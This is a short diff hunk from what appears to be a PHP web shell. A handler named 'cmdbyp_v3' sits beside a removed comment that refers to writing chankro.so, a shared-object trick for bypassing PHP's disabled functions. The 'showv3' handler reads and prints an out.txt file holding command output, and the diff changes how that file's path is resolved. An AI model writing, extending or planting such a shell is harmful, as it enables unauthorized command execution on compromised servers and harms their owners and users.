@@ -803,9 +803,7 @@ if (isset($_POST['cmdbyp_v3'])) {
 if (isset($_GET['showv3'])) {
     while (ob_get_level()) ob_end_clean();
     header('Content-Type: text/plain; charset=utf-8');
-    // Cari out.txt di direktori yang sama dengan script (tempat chankro.so ditulis)
-    $scriptDir = dirname($_SERVER['SCRIPT_FILENAME']);
-    $outFile = $scriptDir . '/out.txt';
+    $outFile = __DIR__ . '/out.txt';
     if (file_exists($outFile)) {
         readfile($outFile);
     } else {
